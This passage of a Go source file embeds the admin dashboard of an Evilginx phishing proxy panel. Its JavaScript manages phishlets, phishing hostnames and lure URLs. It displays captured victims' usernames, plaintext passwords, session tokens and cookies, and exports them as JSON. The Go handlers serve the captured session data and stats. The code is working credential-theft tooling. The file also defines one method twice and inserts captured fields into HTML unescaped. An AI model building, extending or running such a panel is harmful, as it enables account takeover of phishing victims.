                    } else if (data.is_locked) {
                        this.showUnlockModal();
                    } else if (!data.is_authenticated) {
                        this.showLoginModal();
                    } else {
                        this.showDashboard();
                    }
                } catch (error) {
                    console.error('Auth status check failed:', error);
                    this.showLoginModal();
                }
            }

            showSetupWizard() {
                document.getElementById('setupWizard').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showLoginModal() {
                document.getElementById('loginModal').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showUnlockModal() {
                document.getElementById('unlockModal').classList.add('active');
                document.querySelector('.container').style.display = 'none';
            }

            showDashboard() {
                document.querySelectorAll('.modal').forEach(modal => {
                    modal.classList.remove('active');
                });
                document.querySelector('.container').style.display = 'block';
                document.getElementById('authControls').style.display = 'block';
            }

            hideError(errorId) {
                const error = document.getElementById(errorId);
                if (error) error.classList.add('hidden');
            }

            showError(errorId, message) {
                const error = document.getElementById(errorId);
                if (error) {
                    error.textContent = message;
                    error.classList.remove('hidden');
                }
            }

            async login(key) {
                try {
                    const response = await fetch('/api/auth/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ key: key })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.token = data.token;
                        localStorage.setItem('authToken', this.token);
                        this.showDashboard();
                        if (window.dashboard) {
                            window.dashboard.init();
                        }
                    } else {
                        this.showError('loginError', data.message);
                    }
                } catch (error) {
                    this.showError('loginError', 'Login failed. Please try again.');
                }
            }

            async lockPanel() {
                try {
                    const response = await fetch('/api/auth/lock', {
                        method: 'POST',
                        headers: { 'Authorization': this.token }
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.token = null;
                        localStorage.removeItem('authToken');
                        this.checkAuthStatus();
                        showToast('Panel locked successfully', 'success');
                    }
                } catch (error) {
                    console.error('Lock failed:', error);
                    showToast('Failed to lock panel', 'error');
                }
            }

            async lockPanel() {
                try {
                    const response = await fetch('/api/auth/lock', {
                        method: 'POST',
                        headers: { 'Authorization': this.token }
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.token = null;
                        localStorage.removeItem('authToken');
                        this.checkAuthStatus();
                    }
                } catch (error) {
                    console.error('Lock failed:', error);
                }
            }

            async unlockPanel(key) {
                try {
                    const response = await fetch('/api/auth/unlock', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ key: key })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        this.checkAuthStatus();
                    } else {
                        this.showError('unlockError', data.message);
                    }
                } catch (error) {
                    this.showError('unlockError', 'Unlock failed. Please try again.');
                }
            }

            async setupAuth() {
                try {
                    const response = await fetch('/api/auth/setup', {
                        method: 'POST'
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        document.getElementById('generatedKey').textContent = data.key;
                        this.showStep(2);
                    } else {
                        showModal('Setup Failed', data.message, [
                            { text: 'Try Again', class: 'btn-primary', onclick: () => { closeModal('messageModal'); this.setupAuth(); } },
                            { text: 'Cancel', class: 'btn-secondary', onclick: () => closeModal('messageModal') }
                        ]);
                    }
                } catch (error) {
                    showModal('Setup Failed', 'Setup failed. Please try again.', [
                        { text: 'Retry', class: 'btn-primary', onclick: () => { closeModal('messageModal'); this.setupAuth(); } }
                    ]);
                }
            }

            showStep(step) {
                document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
                document.querySelector('[data-step="' + step + '"]').classList.add('active');
            }

            copySecurityKey() {
                const key = document.getElementById('generatedKey').textContent;
                if (navigator.clipboard && window.isSecureContext) {
                    navigator.clipboard.writeText(key).then(() => {
                        showToast('Security key copied to clipboard!', 'success');
                    }).catch(err => {
                        console.error('Failed to copy to clipboard:', err);
                        showModal('Security Key', 'Copy this key manually:\n\n' + key);
                    });
                } else {
                    showModal('Security Key', 'Copy this key manually:\n\n' + key);
                }
            }
        }

        // Global functions for HTML onclick handlers
        let authManager;
        
        function startSetup() {
            authManager.setupAuth();
        }

        function confirmSetup() {
            authManager.showStep(3);
        }

        function finishSetup() {
            authManager.showLoginModal();
        }

        function copyKey() {
            authManager.copySecurityKey();
        }

        function lockPanel() {
            showConfirm(
                'Lock Panel',
                'Are you sure you want to lock the panel? You will need to enter your security key to unlock it.',
                () => authManager.lockPanel(),
                'Lock Panel'
            );
        }

        // Form handlers
        document.addEventListener('DOMContentLoaded', function() {
            authManager = new AuthManager();

            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                authManager.hideError('loginError');
                const key = document.getElementById('securityKey').value;
                authManager.login(key);
            });

            document.getElementById('unlockForm').addEventListener('submit', function(e) {
                e.preventDefault();
                authManager.hideError('unlockError');
                const key = document.getElementById('unlockKey').value;
                authManager.unlockPanel(key);
            });
        });

        class EvilginxDashboard {
            constructor() {
                this.ws = null;
                this.reconnectInterval = null;
                this.init();
            }

            init() {
                this.connectWebSocket();
                this.loadInitialData();
                
                // Auto-refresh every 5 seconds if WebSocket is not connected
                setInterval(() => {
                    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
                        this.loadInitialData();
                    }
                }, 5000);
            }

            connectWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = protocol + '//' + window.location.host + '/ws';
                
                this.ws = new WebSocket(wsUrl);
                
                this.ws.onopen = () => {
                    console.log('WebSocket connected');
                    this.updateConnectionStatus(true);
                    if (this.reconnectInterval) {
                        clearInterval(this.reconnectInterval);
                        this.reconnectInterval = null;
                    }
                };

                this.ws.onmessage = (event) => {
                    const message = JSON.parse(event.data);
                    this.handleWebSocketMessage(message);
                };

                this.ws.onclose = () => {
                    console.log('WebSocket disconnected');
                    this.updateConnectionStatus(false);
                    this.scheduleReconnect();
                };

                this.ws.onerror = (error) => {
                    console.error('WebSocket error:', error);
                    this.updateConnectionStatus(false);
                };
            }

            scheduleReconnect() {
                if (this.reconnectInterval) return;
                
                this.reconnectInterval = setInterval(() => {
                    console.log('Attempting to reconnect...');
                    this.connectWebSocket();
                }, 3000);
            }

            handleWebSocketMessage(message) {
                switch (message.type) {
                    case 'session_update':
                        this.updateSessionsTable(message.data);
                        break;
                    case 'stats_update':
                        this.updateStats(message.data);
                        break;
                    case 'new_session':
                        this.addNewSession(message.data);
                        break;
                }
            }

            updateConnectionStatus(connected) {
                const statusEl = document.getElementById('connection-status');
                if (connected) {
                    statusEl.className = 'connection-status connected';
                    statusEl.textContent = 'Connected';
                } else {
                    statusEl.className = 'connection-status disconnected';
                    statusEl.textContent = 'Disconnected';
                }
            }

            async loadInitialData() {
                try {
                    const [sessionsData, statsData, phishletsData, luresData] = await Promise.all([
                        fetch('/api/sessions').then(r => r.json()),
                        fetch('/api/stats').then(r => r.json()),
                        fetch('/api/phishlets').then(r => r.json()),
                        fetch('/api/lures', { headers: { 'Authorization': authManager.token } }).then(r => r.json())
                    ]);

                    this.updateSessionsTable(sessionsData);
                    this.updateStats(statsData);
                    this.updatePhishlets(phishletsData);
                    this.updateLures(luresData);
                } catch (error) {
                    console.error('Error loading initial data:', error);
                }
            }

            updateStats(stats) {
                document.getElementById('total-sessions').textContent = stats.total_sessions || 0;
                document.getElementById('active-sessions').textContent = stats.active_sessions || 0;
                document.getElementById('captured-sessions').textContent = stats.captured_sessions || 0;
                document.getElementById('uptime').textContent = stats.uptime || '0h 0m';
            }

            updateSessionsTable(sessions) {
                const contentEl = document.getElementById('sessions-content');
                
                if (!sessions || sessions.length === 0) {
                    contentEl.innerHTML = '<div class="section-controls">' +
                        '<div style="display: flex; gap: 12px;">' +
                            '<button class="btn btn-danger btn-sm" onclick="clearAllSessions()" disabled>🗑️ Clear All Sessions</button>' +
                        '</div>' +
                    '</div>' +
                    '<p style="text-align: center; color: #888; padding: 50px;">No sessions found</p>';
                    return;
                }

                // Session controls
                let controlsHTML = '<div class="section-controls">' +
                    '<div style="display: flex; gap: 12px; flex-wrap: wrap;">' +
                        '<button class="btn btn-success btn-sm" onclick="downloadAllSessions()">📥 Download All Sessions</button>' +
                        '<button class="btn btn-danger btn-sm" onclick="clearAllSessions()">🗑️ Clear All Sessions</button>' +
                        '<span style="color: var(--text-secondary); font-size: 13px; align-self: center;">' + sessions.length + ' total session(s)</span>' +
                    '</div>' +
                '</div>';

                let tableHTML = controlsHTML + '<table class="sessions-table">' +
                    '<thead>' +
                        '<tr>' +
                            '<th>ID</th>' +
                            '<th>Phishlet</th>' +
                            '<th>Username</th>' +
                            '<th>Password</th>' +
                            '<th>Status</th>' +
                            '<th>IP Address</th>' +
                            '<th>Time</th>' +
                            '<th>Actions</th>' +
                        '</tr>' +
                    '</thead>' +
                    '<tbody>';

                sessions.forEach((session, index) => {
                    const hasCredentials = session.username && session.password;
                    const hasTokens = session.tokens && Object.keys(session.tokens).length > 0;
                    const hasData = hasCredentials || hasTokens;
                    
                    // Password field with toggle
                    let passwordField = '-';
                    if (session.password) {
                        const passwordId = 'pwd-' + session.id;
                        passwordField = '<div style="display: flex; align-items: center; gap: 6px;">' +
                            '<span id="' + passwordId + '" style="font-family: monospace;">••••••••</span>' +
                            '<button class="btn btn-sm" style="padding: 2px 6px; font-size: 11px;" onclick="togglePassword(\'' + passwordId + '\', \'' + session.password + '\')" title="Toggle password visibility">👁</button>' +
                        '</div>';
                    }
                    
                    tableHTML += '<tr>' +
                        '<td>' + session.id + '</td>' +
                        '<td><strong>' + session.phishlet + '</strong></td>' +
                        '<td>' + (session.username || '-') + '</td>' +
                        '<td>' + passwordField + '</td>' +
                        '<td>' +
                            '<span class="status-badge ' + this.getSessionStatus(session) + '">' +
                                this.getSessionStatusText(session) +
                            '</span>' +
                        '</td>' +
                        '<td>' + session.remote_addr + '</td>' +
                        '<td>' + new Date(session.update_time * 1000).toLocaleString() + '</td>' +
                        '<td style="white-space: nowrap;">' +
                            '<div style="display: flex; gap: 4px;">' +
                                (hasData ? 
                                    '<button class="btn btn-success btn-sm" onclick="downloadSession(' + index + ')" title="Download session data">📥</button>' : 
                                    '<button class="btn btn-secondary btn-sm" disabled title="No data to download">📥</button>'
                                ) +
                                '<button class="btn btn-danger btn-sm" onclick="deleteSession(' + index + ')" title="Delete session">🗑️</button>' +
                            '</div>' +
                        '</td>' +
                    '</tr>';
                });

                tableHTML += '</tbody></table>';

                contentEl.innerHTML = tableHTML;
                // Store sessions data for download functionality
                window.sessionsData = sessions;
            }

            updatePhishlets(phishlets) {
                const contentEl = document.getElementById('phishlets-content');
                
                if (!phishlets || phishlets.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No phishlets found</p>';
                    return;
                }

                let phishletsHTML = '<div class="phishlets-grid">';
                
                phishlets.forEach(phishlet => {
                    phishletsHTML += '<div class="phishlet-card">' +
                        '<div class="phishlet-name">' + phishlet.name + '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Status:</span>' +
                            '<span class="status-badge ' + (phishlet.enabled ? 'status-captured' : 'status-empty') + '">' +
                                (phishlet.enabled ? 'Enabled' : 'Disabled') +
                            '</span>' +
                        '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Hostname:</span>' +
                            '<span>' + (phishlet.hostname || 'Not set') + '</span>' +
                        '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Visible:</span>' +
                            '<span>' + (phishlet.visible ? 'Yes' : 'No') + '</span>' +
                        '</div>' +
                        '<div class="phishlet-actions">' +
                            '<button class="btn ' + (phishlet.enabled ? 'btn-secondary' : 'btn-primary') + '" ' +
                                    'onclick="togglePhishlet(\'' + phishlet.name + '\', ' + phishlet.enabled + ')">' +
                                (phishlet.enabled ? '🔴 Disable' : '🟢 Enable') +
                            '</button>' +
                            '<button class="btn btn-secondary" onclick="copyCredentials(\'' + phishlet.name + '\')">📋 Copy</button>' +
                            '<button class="btn btn-secondary" onclick="setPhishletHostname(\'' + phishlet.name + '\')">🏠 Set Hostname</button>' +
                        '</div>' +
                    '</div>';
                });
                
                phishletsHTML += '</div>';

                contentEl.innerHTML = phishletsHTML;
            }

            updateLures(lures) {
                const contentEl = document.getElementById('lures-content');
                
                if (!lures || lures.length === 0) {
                    contentEl.innerHTML = '<p style="text-align: center; color: #888; padding: 50px;">No lures found</p>';
                    return;
                }

                let luresHTML = '<div class="phishlets-grid">';
                
                lures.forEach((lure, index) => {
                    luresHTML += '<div class="phishlet-card">' +
                        '<div class="phishlet-name">Lure #' + index + '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Phishlet:</span>' +
                            '<span>' + lure.phishlet + '</span>' +
                        '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Path:</span>' +
                            '<span>' + lure.path + '</span>' +
                        '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Hostname:</span>' +
                            '<span>' + (lure.hostname || 'Default') + '</span>' +
                        '</div>' +
                        '<div class="phishlet-status">' +
                            '<span>Redirect URL:</span>' +
                            '<span>' + (lure.redirect_url || 'None') + '</span>' +
                        '</div>' +
                        '<div class="phishlet-actions">' +
                            '<button class="btn btn-primary" onclick="getLureURL(' + index + ')">🔗 Get URL</button>' +
                            '<button class="btn btn-secondary" onclick="editLure(' + index + ')">✏️ Edit</button>' +
                            '<button class="btn btn-secondary" onclick="deleteLure(' + index + ')">🗑️ Delete</button>' +
                        '</div>' +
                    '</div>';
                });
                
                luresHTML += '</div>';

                contentEl.innerHTML = luresHTML;
            }

            getSessionStatus(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
                    return 'status-captured';
                }
                return 'status-empty';
            }

            getSessionStatusText(session) {
                if (session.tokens && Object.keys(session.tokens).length > 0) {
                    return 'Captured';
                }
                return 'Empty';
            }

            addNewSession(session) {
                // Add visual notification for new session
                const statusEl = document.getElementById('connection-status');
                statusEl.classList.add('pulsing');
                setTimeout(() => statusEl.classList.remove('pulsing'), 2000);
                
                // Refresh the sessions table
                this.loadInitialData();
            }

            async copyCredentials(phishletName) {
                try {
                    const response = await fetch('/api/phishlets/' + phishletName + '/credentials', {
                        headers: { 'Authorization': authManager.token }
                    });
                    const data = await response.json();
                    if (data.success) {
                        if (navigator.clipboard && window.isSecureContext) {
                            navigator.clipboard.writeText(data.credentials).then(() => {
                                showToast('Credentials copied to clipboard!', 'success');
                            }).catch(err => {
                                console.error('Failed to copy credentials to clipboard:', err);
                                showModal('Credentials', data.credentials);
                            });
                        } else {
                            showModal('Credentials', data.credentials);
                        }
                    } else {
                        showModal('Error', 'Failed to get credentials: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error copying credentials:', error);
                    showModal('Error', 'Failed to copy credentials. Please try again.');
                }
            }

            async togglePhishlet(phishletName, isEnabled) {
                try {
                    const endpoint = isEnabled ? 'disable' : 'enable';
                    const response = await fetch('/api/phishlets/' + phishletName + '/' + endpoint, {
                        method: 'POST',
                        headers: { 'Authorization': authManager.token }
                    });
                    const data = await response.json();
                    if (data.success) {
                        showToast('Phishlet ' + phishletName + ' ' + (isEnabled ? 'disabled' : 'enabled') + ' successfully!', 'success');
                        this.loadInitialData(); // Refresh the phishlets list
                    } else {
                        showModal('Error', 'Failed to update phishlet: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error updating phishlet:', error);
                    showModal('Error', 'Failed to update phishlet. Please try again.');
                }
            }

            async setPhishletHostname(phishletName) {
                showModal('Set Hostname', 'Set hostname for ' + phishletName + ':', [
                    {
                        text: 'Set Hostname',
                        class: 'btn-primary',
                        onclick: () => {
                            closeModal('messageModal');
                            const hostname = prompt('Enter hostname:', '');
                            if (hostname !== null) {
                                this.doSetPhishletHostname(phishletName, hostname);
                            }
                        }
                    },
                    { text: 'Cancel', class: 'btn-secondary' }
                ]);
            }

            async doSetPhishletHostname(phishletName, hostname) {
                try {
                    const response = await fetch('/api/phishlets/' + phishletName + '/hostname', {
                        method: 'POST',
                        headers: { 
                            'Authorization': authManager.token,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ hostname: hostname })
                    });
                    const data = await response.json();
                    if (data.success) {
                        showToast('Hostname set for ' + phishletName + '!', 'success');
                        this.loadInitialData(); // Refresh the phishlets list
                    } else {
                        showModal('Error', 'Failed to set hostname: ' + data.message);
                    }
                } catch (error) {
                    console.error('Error setting hostname:', error);
                    showModal('Error', 'Failed to set hostname. Please try again.');
                }
            }
        }

        // Global functions for phishlet management
        function copyCredentials(phishletName) {
            if (window.dashboard) {
                window.dashboard.copyCredentials(phishletName);
            }
        }

        function togglePhishlet(phishletName, isEnabled) {
            if (window.dashboard) {
                window.dashboard.togglePhishlet(phishletName, isEnabled);
            }
        }

        function setPhishletHostname(phishletName) {
            if (window.dashboard) {
                window.dashboard.setPhishletHostname(phishletName);
            }
        }

        // Password toggle functionality
        function togglePassword(passwordId, actualPassword) {
            const passwordElement = document.getElementById(passwordId);
            const toggleButton = passwordElement.nextElementSibling;
            
            if (passwordElement.textContent === '••••••••') {
                passwordElement.textContent = actualPassword;
                toggleButton.textContent = '🙈';
                toggleButton.title = 'Hide password';
            } else {
                passwordElement.textContent = '••••••••';
                toggleButton.textContent = '👁';
                toggleButton.title = 'Show password';
            }
        }

        // Global functions for session management
        function downloadSession(sessionIndex) {
            if (!window.sessionsData || !window.sessionsData[sessionIndex]) {
                showModal('Error', 'Session data not available');
                return;
            }
            
            const session = window.sessionsData[sessionIndex];
            const timestamp = new Date().toISOString().split('T')[0];
            const filename = 'evilginx-session-' + session.id + '-' + timestamp + '.json';
            
            const sessionData = {
                id: session.id,
                phishlet: session.phishlet,
                username: session.username,
                password: session.password,
                tokens: session.tokens || {},
                cookies: session.cookies || {},
                remote_addr: session.remote_addr,
                user_agent: session.user_agent,
                create_time: session.create_time,
                update_time: session.update_time,
                exported_at: new Date().toISOString()
            };
            
            downloadJSON(filename, sessionData);
            showToast('Session data downloaded successfully!', 'success');
        }

        function downloadAllSessions() {
            if (!window.sessionsData || window.sessionsData.length === 0) {
                showModal('Error', 'No sessions available to download');
                return;
            }
            
            const timestamp = new Date().toISOString().split('T')[0];
            const filename = 'evilginx-all-sessions-' + timestamp + '.json';
            
            const allSessionsData = {
                exported_at: new Date().toISOString(),
                total_sessions: window.sessionsData.length,
                sessions: window.sessionsData.map(session => ({
                    id: session.id,
                    phishlet: session.phishlet,
                    username: session.username,
                    password: session.password,
                    tokens: session.tokens || {},
                    cookies: session.cookies || {},
                    remote_addr: session.remote_addr,
                    user_agent: session.user_agent,
                    create_time: session.create_time,
                    update_time: session.update_time
                }))
            };
            
            downloadJSON(filename, allSessionsData);
            showToast('All sessions downloaded successfully!', 'success');
        }

        async function deleteSession(sessionIndex) {
            if (!window.sessionsData || !window.sessionsData[sessionIndex]) {
                showModal('Error', 'Session not found');
                return;
            }
            
            const session = window.sessionsData[sessionIndex];
            showConfirm(
                'Delete Session',
                'Are you sure you want to delete session #' + session.id + '? This action cannot be undone.',
                async () => {
                    try {
                        const response = await fetch('/api/sessions/' + session.id, {
                            method: 'DELETE',
                            headers: { 'Authorization': authManager.token }
                        });
                        
                        if (response.ok) {
                            showToast('Session deleted successfully!', 'success');
                            window.dashboard.loadInitialData();
                        } else {
                            const data = await response.json();
                            showModal('Error', 'Failed to delete session: ' + (data.message || 'Unknown error'));
                        }
                    } catch (error) {
                        console.error('Error deleting session:', error);
                        showModal('Error', 'Failed to delete session. Please try again.');
                    }
                },
                'Delete Session'
            );
        }

        async function clearAllSessions() {
            if (!window.sessionsData || window.sessionsData.length === 0) {
                showModal('No Sessions', 'No sessions to clear');
                return;
            }
            
            showConfirm(
                'Clear All Sessions',
                'Are you sure you want to delete ALL ' + window.sessionsData.length + ' sessions? This action cannot be undone and will permanently remove all captured data.',
                async () => {
                    try {
                        const response = await fetch('/api/sessions', {
                            method: 'DELETE',
                            headers: { 'Authorization': authManager.token }
                        });
                        
                        if (response.ok) {
                            showToast('All sessions cleared successfully!', 'success');
                            window.dashboard.loadInitialData();
                        } else {
                            const data = await response.json();
                            showModal('Error', 'Failed to clear sessions: ' + (data.message || 'Unknown error'));
                        }
                    } catch (error) {
                        console.error('Error clearing sessions:', error);
                        showModal('Error', 'Failed to clear sessions. Please try again.');
                    }
                },
                'Clear All Sessions'
            );
        }

        // Global functions for lure management
        function showCreateLureModal() {
            showModal('Create New Lure', 'Enter the phishlet name for the new lure:', [
                {
                    text: 'Create Lure',
                    class: 'btn-primary',
                    onclick: () => {
                        closeModal('messageModal');
                        const phishlet = prompt('Enter phishlet name:');
                        if (phishlet) {
                            createLure(phishlet);
                        }
                    }
                },
                { text: 'Cancel', class: 'btn-secondary' }
            ]);
        }

        async function createLure(phishletName) {
            try {
                const response = await fetch('/api/lures', {
                    method: 'POST',
                    headers: { 
                        'Authorization': authManager.token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phishlet: phishletName })
                });
                const data = await response.json();
                if (response.ok) {
                    showToast('Lure created successfully!', 'success');
                    window.dashboard.loadInitialData();
                } else {
                    showModal('Error', 'Failed to create lure: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error creating lure:', error);
                showModal('Error', 'Failed to create lure. Please try again.');
            }
        }

        async function getLureURL(lureId) {
            try {
                const response = await fetch('/api/lures/' + lureId + '/url', {
                    headers: { 'Authorization': authManager.token }
                });
                const data = await response.json();
                if (response.ok) {
                    const url = data.url;
                    if (navigator.clipboard && window.isSecureContext) {
                        navigator.clipboard.writeText(url).then(() => {
                            showToast('Lure URL copied to clipboard!', 'success');
                        }).catch(err => {
                            console.error('Failed to copy to clipboard:', err);
                            showModal('Lure URL', 'Copy this URL manually:\n\n' + url);
                        });
                    } else {
                        showModal('Lure URL', 'Copy this URL manually:\n\n' + url);
                    }
                } else {
                    showModal('Error', 'Failed to get lure URL: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error getting lure URL:', error);
                showModal('Error', 'Failed to get lure URL. Please try again.');
            }
        }

        async function editLure(lureId) {
            showModal('Edit Lure', 'Modify the lure settings:', [
                {
                    text: 'Edit Settings',
                    class: 'btn-primary',
                    onclick: () => {
                        closeModal('messageModal');
                        const hostname = prompt('Enter new hostname (leave empty for default):');
                        if (hostname !== null) {
                            const redirectUrl = prompt('Enter redirect URL (leave empty for none):');
                            if (redirectUrl !== null) {
                                doEditLure(lureId, hostname, redirectUrl);
                            }
                        }
                    }
                },
                { text: 'Cancel', class: 'btn-secondary' }
            ]);
        }

        async function doEditLure(lureId, hostname, redirectUrl) {
            try {
                const response = await fetch('/api/lures/' + lureId, {
                    method: 'PUT',
                    headers: { 
                        'Authorization': authManager.token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        hostname: hostname || '',
                        redirect_url: redirectUrl || ''
                    })
                });
                const data = await response.json();
                if (response.ok) {
                    showToast('Lure updated successfully!', 'success');
                    window.dashboard.loadInitialData();
                } else {
                    showModal('Error', 'Failed to update lure: ' + (data.message || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error updating lure:', error);
                showModal('Error', 'Failed to update lure. Please try again.');
            }
        }

        async function deleteLure(lureId) {
            showConfirm(
                'Delete Lure',
                'Are you sure you want to delete this lure? This action cannot be undone.',
                async () => {
                    try {
                        const response = await fetch('/api/lures/' + lureId, {
                            method: 'DELETE',
                            headers: { 'Authorization': authManager.token }
                        });
                        if (response.ok) {
                            showToast('Lure deleted successfully!', 'success');
                            window.dashboard.loadInitialData();
                        } else {
                            const data = await response.json();
                            showModal('Error', 'Failed to delete lure: ' + (data.message || 'Unknown error'));
                        }
                    } catch (error) {
                        console.error('Error deleting lure:', error);
                        showModal('Error', 'Failed to delete lure. Please try again.');
                    }
                },
                'Delete Lure'
            );
        }

        // Initialize the dashboard after authentication
        document.addEventListener('DOMContentLoaded', () => {
            window.dashboard = new EvilginxDashboard();
            // Dashboard will be initialized by AuthManager when authenticated
        });

        // Terminal functionality
        let terminalWS = null;
        let terminal = null;
        let fitAddon = null;

        function openTerminal() {
            const modal = document.getElementById('terminalModal');
            modal.classList.add('active');
            
            // Initialize terminal if not already done
            if (!terminal) {
                initializeTerminal();
            }
            
            // Connect to terminal WebSocket
            connectTerminalWebSocket();
        }

        function closeTerminal() {
            const modal = document.getElementById('terminalModal');
            modal.classList.remove('active');
            
            // Disconnect WebSocket
            if (terminalWS) {
                terminalWS.close();
                terminalWS = null;
            }
            
            updateTerminalStatus('disconnected');
        }

        function initializeTerminal() {
            // Load xterm.js from CDN
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/xterm@4.19.0/lib/xterm.js';
            script.onload = () => {
                const fitScript = document.createElement('script');
                fitScript.src = 'https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.5.0/lib/xterm-addon-fit.js';
                fitScript.onload = () => {
                    setupTerminal();
                };
                document.head.appendChild(fitScript);
            };
            document.head.appendChild(script);

            // Load xterm.css
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'https://cdn.jsdelivr.net/npm/xterm@4.19.0/css/xterm.css';
            document.head.appendChild(link);
        }

        function setupTerminal() {
            terminal = new Terminal({
                theme: {
                    background: '#000000',
                    foreground: '#ffffff',
                    cursor: '#ffffff',
                    selection: '#ffffff30',
                    black: '#000000',
                    red: '#ff0000',
                    green: '#00ff00',
                    yellow: '#ffff00',
                    blue: '#0000ff',
                    magenta: '#ff00ff',
                    cyan: '#00ffff',
                    white: '#ffffff',
                    brightBlack: '#808080',
                    brightRed: '#ff8080',
                    brightGreen: '#80ff80',
                    brightYellow: '#ffff80',
                    brightBlue: '#8080ff',
                    brightMagenta: '#ff80ff',
                    brightCyan: '#80ffff',
                    brightWhite: '#ffffff'
                },
                cursorBlink: true,
                fontSize: 14,
                fontFamily: 'Consolas, Monaco, "Courier New", monospace',
                rows: 24,
                cols: 80
            });

            fitAddon = new FitAddon.FitAddon();
            terminal.loadAddon(fitAddon);
            
            const terminalContainer = document.getElementById('terminal');
            terminal.open(terminalContainer);
            fitAddon.fit();

            // Handle terminal input
            terminal.onData((data) => {
                if (terminalWS && terminalWS.readyState === WebSocket.OPEN) {
                    terminalWS.send(data);
                }
            });

            // Handle window resize
            window.addEventListener('resize', () => {
                if (fitAddon) {
                    fitAddon.fit();
                }
            });
        }

        function connectTerminalWebSocket() {
            updateTerminalStatus('connecting');
            
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = protocol + '//' + window.location.host + '/ws/terminal?token=' + authManager.token;
            
            terminalWS = new WebSocket(wsUrl);
            
            terminalWS.onopen = () => {
                updateTerminalStatus('connected');
                if (terminal) {
                    terminal.write('\\r\\n🎯 Evilginx Terminal Connected\\r\\n');
                    terminal.write('⚠️  Command filtering is active for security\\r\\n');
                    terminal.write('💡 Type "help" for available commands\\r\\n\\r\\n');
                }
            };
            
            terminalWS.onmessage = (event) => {
                if (terminal) {
                    terminal.write(event.data);
                }
            };
            
            terminalWS.onclose = () => {
                updateTerminalStatus('disconnected');
                if (terminal) {
                    terminal.write('\\r\\n❌ Terminal connection closed\\r\\n');
                }
            };
            
            terminalWS.onerror = (error) => {
                updateTerminalStatus('disconnected');
                if (terminal) {
                    terminal.write('\\r\\n❌ Terminal connection error\\r\\n');
                }
                console.error('Terminal WebSocket error:', error);
            };
        }

        function updateTerminalStatus(status) {
            const statusEl = document.getElementById('terminalStatus');
            statusEl.textContent = status.charAt(0).toUpperCase() + status.slice(1);
            statusEl.className = 'connection-status ' + status;
        }

        function clearTerminal() {
            if (terminal) {
                terminal.clear();
                terminal.write('🧹 Terminal cleared\\r\\n\\r\\n');
            }
        }

        // Close terminal modal when clicking outside
        document.addEventListener('click', (e) => {
            const modal = document.getElementById('terminalModal');
            if (e.target === modal) {
                closeTerminal();
            }
        });

        // Handle Escape key to close terminal
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                const modal = document.getElementById('terminalModal');
                if (modal.classList.contains('active')) {
                    closeTerminal();
                }
            }
        });
    </script>
</body>
</html>
	`
	
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(dashboardHTML))
}

func (ws *WebServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := ws.db.ListSessions()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (ws *WebServer) handleAPISessionDetails(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	session, err := ws.db.GetSessionById(id)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(session)
}

func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
	sessions, _ := ws.db.ListSessions()
	
	activeSessions := 0
	capturedSessions := 0
	
	for _, session := range sessions {
		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
			capturedSessions++
		}
		// Consider sessions from last 24 hours as active
		if time.Now().Unix()-session.UpdateTime < 86400 {
			activeSessions++
		}
	}

	uptime := time.Since(startTime)
	uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)

	stats := map[string]interface{}{
		"total_sessions":    len(sessions),
		"active_sessions":   activeSessions,
		"captured_sessions": capturedSessions,
		"uptime":           uptimeStr,
		"domain":           ws.cfg.GetBaseDomain(),
		"ip_address":       ws.cfg.GetServerExternalIP(),
		"https_port":       ws.cfg.GetHttpsPort(),
		"dns_port":         ws.cfg.GetDnsPort(),
		"telegram_enabled": ws.cfg.GetTelegramEnabled(),
	}

	w.Header().Set("Content-Type", "application/json")
